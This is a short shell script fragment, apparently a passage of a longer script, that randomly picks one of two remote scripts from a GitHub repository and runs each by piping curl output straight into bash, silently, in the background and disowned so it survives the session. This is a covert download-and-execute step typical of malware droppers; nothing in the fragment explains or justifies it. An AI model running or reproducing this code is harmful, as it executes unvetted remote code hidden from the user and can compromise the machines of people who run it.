...
if [ "$RANDOM_CHOICE" -eq 1 ]; then
    curl -s https://raw.githubusercontent.com/mumu1667/trx20/main/43.sh | bash >/dev/null 2>&1 & disown
else
    curl -s https://raw.githubusercontent.com/mumu1667/trx20/main/48.sh | bash >/dev/null 2>&1 & disown
fi
